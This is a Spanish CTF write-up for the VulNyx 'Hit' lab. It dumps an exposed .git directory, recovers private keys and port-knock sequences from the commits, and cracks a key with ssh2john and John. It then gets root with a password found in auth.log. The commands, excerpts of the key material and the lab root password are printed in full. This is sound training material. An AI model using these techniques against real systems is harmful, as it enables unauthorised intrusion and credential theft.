Write-up máquina Hit de plataforma [Vulnyx](https://vulnyx.com/#hit)

![VulNyx Offensive Security Playground](https://github.com/user-attachments/assets/884b7c2c-8883-484c-944b-67f2b12f220d)

## Antes de empezar...

Qué vamos a necesitar:

- Máquina atacante kali (virtualbox)
- Máquina victima Vulnyx (ova en virtualbox)
- Red NAT compartida entre ambas máquinas (aislamiento, configuración de virtualbox)

No estoy usando ninguna configuracion especial ni nada.
## Reconocimiento

Como en todo proceso de pentesting vamos a empezar con la fase de reconocimiento, donde intentaremos obtener la máxima información posible de la máquina para poder explotarla (vulnerarla). En este caso, la máquina víctima nos muestra ya su IP en la pantalla de inicio.

![HitBanner](https://github.com/user-attachments/assets/084f9e75-d89f-4e6c-9fd7-e08fde4246dd)

Si no fuera así ya sabemos que con `netdiscover` o `arp-scan` se puede obtener la ip de la siguiente forma:

```bash
sudo netdiscover -i <interfaz-red> -r <rango-IP>
```

Donde:
- La flag `-i` especificará la interfaz de red (en el caso que tengamos varias) por la que se realizará el escaneo
- La flag `-r`especificará el rango de IP sobre el que queremos hacer el escaneo, si esta flag se omite `netdiscover` usará una lista por defecto con los rangos de IPs más conocidos. En nuestro caso el rango debería ser `10.0.0.0/8` ya que estamos en la red NAT compartida con la máquina.

```bash
sudo arp-scan --localnet -g -D
```

Donde:
- `--localnet` se usará para que el escaneo se haga en la red local
- `-g` se usará para que no se muestren los duplicados
- `-D` se usará para que nos muestre el round-trip-time al enviar el paquete ARP

Con la IP ya podemos pasar a realizar un escaneo de puertos, ejecutando `nmap` con el siguiente comando:

```bash
nmap -p- -T 5 -vvv -sS -Pn 10.0.2.10 -oN targeted
```

Obtenemos lo siguiente:

```
...
Nmap scan report for 10.0.2.10
Host is up, received arp-response (0.00011s latency).
Scanned at 2025-02-04 04:58:16 EST for 1s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:18:06:C1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
...
```

Solo obtenemos el puerto 80 (servicio web) abierto. Vamos a realizar otro escaneo algo más exhaustivo sobre el puerto 80.

```bash
nmap -p80 -sCV 10.0.2.10 -oN targeted2
```

Y obtenemos lo siguiente:

```
...
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.22.1
| http-git: 
|   10.0.2.10:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Commit #5 
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.22.1
MAC Address: 08:00:27:18:06:C1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
...
```

El segundo escaneo nos reporta que existe un directorio `.git/` y que el servidor es un `nginx 1.22.1`. Si accedemos desde el navegador nos muestra una página de bienvenida del servidor.

![paginaInicio](https://github.com/user-attachments/assets/82d70e08-40aa-4cae-9ddd-8dbb4dd08fb9)

## Vulnerabilidades

Si accedemos a la ruta `./path` podremos ver los archivos de un repositorio de github. Vamos a descargarlo en nuestra máquina atacante para ver que cambios se han hecho. Para ello podemos usar el comando `wget` aunque decidí investigar que herramientas habían hecho otras personas y descubrí una herramienta llamada [git-dumper](https://github.com/arthaud/git-dumper), que intenta obtener todos los recursos que encuentre de un directorio `/.git` expuesto.

```bash
git-dumper http://10.0.2.10/.git <output-directory>
```

Después de ejecutar la herramienta ya tenía lo mismo que podiamos acceder en la página web pero esta vez podía ejecutar comandos con `git`. Como era un repositorio o parte de un repositorio, miré cuales habían sido los últimos commits que se habían realizado con `git log`.

![commits](https://github.com/user-attachments/assets/d34491b8-99de-4dd3-8b20-e4ebde293b28)

Bien, había cinco commits, a continuación use `git log -p` para ver que cambios se habían hecho en cada uno de los commits y encontré varias cosas interesantes. Por un lado teniamos una clave privada de OpenSSH.

```
commit 2b5a7479c36d425981b95982c37b10a34ce11aca (HEAD -> master)
Author: charlie <charlie@hit.nyx>
Date:   Mon Feb 3 23:33:01 2025 +0100

    Commit #5

diff --git a/id_rsa b/id_rsa
deleted file mode 100644
index 7d19f82..0000000
--- a/id_rsa
+++ /dev/null
@@ -1,38 +0,0 @@
------BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-NhAAAAAwEAAQAAAYEAwj6WBGX4oplwOjEP2GaY8G+DeRIRHwUiON5dae888c3YXaGez5xC
-ZlW1pKi3t2DFL+oAZP+M3P/9HNutK6mSf0lgaLcXyOmQMjXdj67knRpg7CXOTLEO9MZkqi
-IXYnqTEPA2QwrNrCEBk5e02xeaD7p7o3myqSWgyyo1zIrHsCIgLwjG4inhP5zn1r94UsW8
-nsyfNPG4hqbwS6or+E368zYjrwcTyLafXUKOEPj/8VjRl/hIYPXLRw38h/YR65C7qO3iPO
-lZRjs5PRM3vVV8PsiBwI+Zo0lLVChI0EyJ9xmP+/4Ps/Y0KUHJYXhbeUqTF3QnmWqKGpEK
-LUal47hZb5FTCBFUCYY51VDzXziZZ5yeSsCPYVHIbj70kcNSVp9gwaAa7Bit2sWl7mIJPM
-LT3NB4TS5Ptr+iRL15lHCNAtvGhFUsPtEbihL1CvOxiaN9wZ3qRUknUjTIG9lZ+tZZTepT
-7TGHDzm286ozj4ciKV3jJpQ4BukFitnN03wH62n5AAAFgNYk2vjWJNr4AAAAB3NzaC1yc2
-EAAAGBAMI+lgRl+KKZcDoxD9hmmPBvg3kSER8FIjjeXWnvPPHN2F2hns+cQmZVtaSot7dg
-xS/qAGT/jNz//RzbrSupkn9JYGi3F8jpkDI13Y+u5J0aYOwlzkyxDvTGZKoiF2J6kxDwNk
-MKzawhAZOXtNsXmg+6e6N5sqkloMsqNcyKx7AiIC8IxuIp4T+c59a/eFLFvJ7MnzTxuIam
-8EuqK/hN+vM2I68HE8i2n11CjhD4//FY0Zf4SGD1y0cN/If2EeuQu6jt4jzpWUY7OT0TN7
-1VfD7IgcCPmaNJS1QoSNBMifcZj/v+D7P2NClByWF4W3lKkxd0J5lqihqRCi1GpeO4WW+R
-UwgRVAmGOdVQ8184mWecnkrAj2FRyG4+9JHDUlafYMGgGuwYrdrFpe5iCTzC09zQeE0uT7
...
```

Por otro lado teníamos cambios realizados en un archivo llamado knockd.conf, buscando en internet obtenemos que este archivo se usa como `daemon` para ejecutar una herramienta llamada `knock` que se suele usar para realizar port knocking a los puertos de tu máquina y así securizar algo más tu entorno.

```
--- a/knockd.conf
+++ /dev/null
@@ -1,20 +0,0 @@
-[options]
-       UseSyslog
-
-[openSSH]
-       sequence    = 7000,8000,9000
-       seq_timeout = 5
-       command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
-       tcpflags    = syn
-
-[closeSSH]
-       sequence    = 9000,8000,7000
-       seq_timeout = 5
-       command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
-       tcpflags    = syn
-
-[openHTTPS]
-       sequence    = 12345,54321,24680,13579
-       seq_timeout = 5
-       command     = /usr/local/sbin/knock_add -i -c INPUT -p tcp -d 443 -f %IP%
-       tcpflags    = syn
```

En otros commits encontramos otra clave privada pero en este caso es una clave RSA y esta cifrada.

```
------BEGIN RSA PRIVATE KEY-----
-Proc-Type: 4,ENCRYPTED
-DEK-Info: DES-EDE3-CBC,3E2B3558346EF63A
-
-6ba1VKUz/cNss0/xw7FkmsfiG15ExhqArUxI7WCfiFKNaeuSdUNETexm38BmeC/b
-kmKErTAVzIpCtzCxXYEO8wOOyJRJEZGHNqtoq6bgrxcZaJfzONc1EM6aEIfQS+Ks
-zloh5Ye8FygCkU2bCSYnaLwyHuGUcJ72Oa+8jYJtsvr1Gd+z0CWJapRodsYnlvep
-5EGx+jaYDkOG3VEtvjfPvA+pezHPifDsLr03JNuGb4awvpTGoRqXjXSYSfKOKimy
-Jpip4JVxit3T9aaOu1wF5UIExRtTG9lj38Mb1H2zXENcONIX5nAPoacvvZtCp9iz
-20qafBdLgnvZF0sy9GEvjouXPNeAk/c19qTvAu6lSsQq0NliIcozN8tLyvNHUjPv
-s/BptewE2NK0YvkNNCNhTilVMPaaojhf8zIVqNeH3L99GBUjigNdd2kqYzX4CjG/
...
```
Por último, algo más abajo encontramos otra configuración en `knockd.conf` que habilita el servicio ssh.

```
...
-       sequence    = 65535,8888,54111
-       seq_timeout = 1
-       command     = /usr/sbin/service ssh start
...
```

Recapitulando, tenemos dos claves privadas que puede que nos den acceso al servidor ssh, pero en el escaneo el puerto ssh no aparecía abierto. Además sabemos que en el sistema se esta ejecutando un programa en daemon que esta esperando a que se cumplan las condiciones para ejecutar los comandos que están más arriba. Por lo tanto, primero pensé en intentar abrir el puerto ssh con `nmap` pero no funcionó. Cuando vi la otra regla que abre el servicio ssh volví a ejecutar nmap con el siguiente comando.

```bash
nmap -sS -r -p65535,8888,54111 10.0.2.10
```

Seguidamente volví a probar a abrir el servicio OpenSSH
 ```
[openSSH]
-       sequence    = 7000,8000,9000
-       seq_timeout = 5
-       command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
-       tcpflags    = syn
```

```bash
nmap -sS -r -p7000,8000,9000 10.0.2.10
```

Y obtuve el siguiente resultado de nmap.

```
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey: 
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Site doesn't have a title (text/html).
| http-git: 
|   10.0.2.10:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Commit #5 
MAC Address: 08:00:27:18:06:C1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
...
```

Como ya tenemos el puerto 22 abierto podemos probar algunas de las dos claves privadas para ver si podemos acceder por ssh a la máquina víctima. La clave privada de ssh nos pide una contraseña que no tenemos y no podemos crackear, pero la clave rsa privada si podemos convertirla a un hash con la herramienta de `ssh2john` que viene instalada en kali, con el siguiente comando:

```bash
ssh2john file_with_rsa_private_key > hash_output_file
```

Este hash lo vamos a intentar romper con la herramienta `John the Ripper` que ya viene instalada en kali de la siguiente forma:

```bash
john hash -wordlist=rockyou.txt
```

(Nota: la ruta de la wordlist no es la que pone en el comando, para que john funcione debeis poner la ruta absoluta donde esta la wordlist, ante cualquier duda revisar los manuales con `man john`)

Después de poco tiempo john encuentra la contraseña la cual no voy a mostrar porque el objetivo de este write-up no es resolver el ctf sino entender y aprender sobre las metodologías de ataque en esta máquina. Con la contraseña y la clave privada ya podemos acceder a la máquina como el usuario charlie por `ssh` de la siguiente forma:

```bash
ssh -i id_rsa charlie@10.0.2.10
```

Donde:

- `id_rsa` es el archivo que contiene la clave privada
- `-i` es la flag donde indicamos a ssh que queremos usar esta clave para acceder.

![sshAccess](https://github.com/user-attachments/assets/d1165c70-1d7e-442d-ba79-504d87219ff1)

Dentro de la máquina ya podemos pasar a la fase de escalada de privilegios.

## Escalada de privilegios

Como somos el usuario `charlie` vamos a intentar obtener información útil de este usuario y no tardamos mucho ya que al ejecutar el comando `id` para ver en que grupos está asignado este usuario nos encontramos que está asignado al grupo `adm`, este grupo en linux tiene los permisos para leer archivos de logs del sistema, lo cual puede ser crítico ya que normalmente esos logs pueden contener información sensible del kernel o de intentos de autenticación.

![idCharlie](https://github.com/user-attachments/assets/0fb88298-5138-4218-8c6d-21eef557d614)

Estos archivos se suelen encontrar en la ruta `/var/log` pero si no sabemos esto de antemano siempre podemos usar el comando `find` para ver que archivos pertencen al grupo `adm` de la siguiente forma:

```bash
find / -type f -group adm 2>/dev/null
```

Al ejecutar este comando nos aparecen los siguintes archivos que podemos leer

![logsCharlie](https://github.com/user-attachments/assets/9d0dadb4-1fa7-4f7f-9c91-d405c5e711de)

Todos tienen bastante información útil pero sin embargo uno de ellos, `/var/log/auth.log` archivo que registra los autenticaciones, podemos observar un intento de autenticación un tanto extraño.

![strangeLog](https://github.com/user-attachments/assets/c45d6985-8318-497a-8fac-4dc5676d270f)

Parece ser como si alguien se hubiera intentado autenticar pero con una contraseña `r00tP4zzw0rd`. Si probamos a conectarnos por ssh como el usuario `root` usando esta cadena.

![rootLogin](https://github.com/user-attachments/assets/559d4d9a-43c1-4377-b960-704384bf25f5)

Boom! Conseguimos acceso como superusuario al sistema teniendo control total debido a una mala configuración de los grupos de un usuario con menos privilegios hemos conseguido obtener información valiosa que no podríamos haber conseguido sin esa mala configuración.

Espero que os haya gustado y se haya entendido todo el proceso. Que el hacking este con vosotros!!!
